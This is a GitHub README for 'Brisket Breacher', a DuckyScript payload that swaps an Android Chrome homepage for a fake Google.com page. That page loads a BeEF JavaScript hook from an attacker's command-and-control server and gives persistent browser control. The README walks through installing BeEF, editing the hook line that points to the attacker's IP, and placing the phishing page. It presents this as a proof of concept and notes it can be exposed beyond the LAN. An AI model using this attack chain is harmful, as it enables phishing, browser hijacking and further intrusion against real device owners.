<div align="center">
  
# Brisket Breacher

![bb](https://github.com/user-attachments/assets/019730d7-db7d-4a9a-a892-06df2b390adc)

</div>

**Target Os:** Android mobile device/Google Chrome (tested on Samsung S24 FE | One UI V7.0 | Android V15).

## What is Brisket Breacher?

Brisket Breacher is DuckyScript payload that targets the Android mobile device Google Chrome browser utilizing the Browser Exploitation Framework ([BeEF](https://www.kali.org/tools/beef-xss/)). The payload changes the homepage of the Google Chrome browser to an imitation `Google.com` landing page. When a victim device opens the Google Chrome browser to the homepage, the imitation Google.com page points to a BeEF command and control server via a Javascript BeEF hook, where the attacker has direct control over the browser to allow for further attacks. For the attack to work, the attacker must setup a BeEF C2 server, configure the homepage, and edit the URL to the C2 in the payload.txt (all explained below).

For the purposes of this PoC the BeEF C2 will be hosted locally over LAN, where the attacker machine and target device must be on the same LAN for the attack to be succesful. The same attack can be used outside of LAN if setup via methods such as port forwarding or hosting services.

**Persistence**

Due to the payload changing the homepage in the settings of the Google Chrome browser, this creates persistence. *Even* if the phone is restarted, it won't matter, when the browser homepage is loaded, it will *always* attempt to connect to the BeEF C2.

## Dependencies
- **Setting up the BeEF command and control server using a [Kali Linux](https://www.kali.org) box.**
  - Once you have spun-up an instance of Kali (our attacker machine), you must first find the IP address of the machine. This can be found via `ifconfig`, store the IP address as it will be needed in multiple places momentarily.
  - Install BeEF:
    - `sudo apt install beef-xss -y`
  - Download the [homepage.html](https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Brisket_Breacher/homepage.html) file (described next). This will be the homepage that our malicious URL will point to and deliber the BeEF C2 hook.
      - Open the homepage.html and edit the BeEF C2 hook (line 141 `<script src="http://X.X.X.X:3000/hook.js"></script>`) with the IP address gathered from `ifconfig` of the attacker machine and then save the updated file.
      - Become root: `sudo su`.
      - With the homepage.html file in your current working directory, move it to the following directory: `mv homepage.html /usr/share/beef-xss/extensions/demos/html`.
